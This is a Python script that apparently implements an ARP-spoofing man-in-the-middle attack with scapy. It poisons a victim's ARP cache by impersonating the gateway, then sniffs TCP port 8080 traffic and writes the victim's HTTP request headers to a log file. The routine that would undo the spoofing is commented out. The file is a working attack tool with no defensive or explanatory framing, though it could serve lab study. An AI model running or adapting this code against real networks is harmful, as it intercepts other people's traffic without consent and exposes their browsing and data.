#!/usr/bin/python
from scapy.all import *
import netifaces
import socket
import thread
import signal
import sys

def undo_spoof():
	sendp(packet, count=7, verbose=0)

def ctrlc_handler(signum, frm):
	#undo_spoof() - change to unspoof both gw and victim
	sys.exit()

def arp_spoof_victim(pkt):
	send(pkt, loop=1, inter=0.3, verbose=0)

def arp_spoof_gateway(pkt):
	send(pkt, loop=1, inter=0.3, verbose=0)

def get_victim_mac(vict_ip):
	while True:
        	arp_req = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=vict_ip, hwdst="ff:ff:ff:ff:ff:ff")
        	arp_resp = srp1(arp_req, timeout=11, verbose=0)
		if arp_resp:
			break

	return arp_resp.hwsrc

def get_gateway_mac(gw_ip):
	while True:
		arp_req = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw_ip, hwdst="ff:ff:ff:ff:ff:ff")
        	arp_resp = srp1(arp_req, timeout=11, verbose=0)
		if arp_resp:
			break

	return arp_resp.hwsrc


def get_my_ip(iface):
	if_addresses = netifaces.ifaddresses(iface)
	interface_info = if_addresses[socket.AF_INET][0]
	return interface_info["addr"]

def get_my_mac(iface):
	if_addresses = netifaces.ifaddresses(iface)
	interface_info = if_addresses[netifaces.AF_LINK]
        return interface_info[0]["addr"]

def process_pkt(pkt):
	#packets from victim
	if pkt[0] and pkt[0].haslayer(TCP) and pkt[0].getlayer(TCP) and  pkt[0].getlayer(TCP).dport == 8080 and pkt[0].haslayer(Raw):
		if pkt[0].getlayer(IP) and pkt[0].getlayer(IP).src == victim_ip:
		#dump request from victim
			log_fh.write("Request from " + pkt[0].getlayer(IP).src + " ===> " + pkt[0].getlayer(Ether).src + "\n")
			print "Request from " + pkt[0].getlayer(IP).src + " ===> " + pkt[0].getlayer(Ether).src
			log_fh.write("Dst " + pkt[0].getlayer(IP).dst + " ===> " + pkt[0].getlayer(Ether).dst + "\n")
			print "Dst " + pkt[0].getlayer(IP).dst + " ===> " + pkt[0].getlayer(Ether).dst
			headers =  pkt[0].getlayer(Raw).load
                	header_lines = headers.split("\n")
			print header_lines
			print "\n"
                	#for h in header_lines:
                        #	if 'post /' in h.lower():
			#		log_fh.write("POST request: " + h[5:len(h)-10] + "\n")
                        #        	print "POST request: " + h[5:len(h)-10]
	                #        elif 'get /' in h.lower():
			#		log_fh.write("GET request: " + h[4:len(h)-10] + "\n")
   	     	        #                print "GET request: " + h[4:len(h)-10]
                	#        if 'Host:' in h:
			#		log_fh.write(h + "\n")
                        #	        print h
                        #	if 'User-Agent:' in h:
			#		log_fh.write(h + "\n")
                        #        	print h
			log_fh.write("\n****************************\n")
			print "\n****************************\n"

	#packets from gw
	#elif pkt[0].getlayer(IP) and pkt[0].getlayer(IP).src == "<gw_ip>" and pkt[0].getlayer(Raw):
	#	print "Response from " + pkt[0].getlayer(IP).src
	#	print pkt[0].getlayer(Raw).load
	#	print "\n****************************\n"

def spoof_gw_with_victim(pkt):
	send(pkt, loop=1, inter=0.3, verbose=0)	


log_fh = open('arp_mitm.log', 'w')

signal.signal(signal.SIGINT, ctrlc_handler)


interface = "eth1"
victim_ip = "<ip_addr>"
gateway_ip = "<ip_addr>"
victim_mac = "02:02:02:02:de:ad" #get_victim_mac(victim_ip)
gateway_mac = "01:01:01:01:be:ef" #get_gateway_mac(gateway_ip)
my_ip = get_my_ip(interface)
my_mac = get_my_mac(interface)

print "my_ip: " + my_ip
print "my_mac: " + my_mac
print "v_mac: " + victim_mac
print "gw_mac: " + gateway_mac

#  poison victim
op=1
spoofed_packet = ARP(op=op,psrc=gateway_ip,hwdst=victim_mac, pdst=victim_ip)
print "Starting victim ARP spoofing thread"
try:
   thread.start_new_thread(arp_spoof_victim,(spoofed_packet,))
   print "Victim spoofing thread started"
except:
   print "Error: unable to start victim spoofing thread"

while 1:
        sniff(iface=interface,count=1,filter="tcp port 8080",prn=process_pkt)

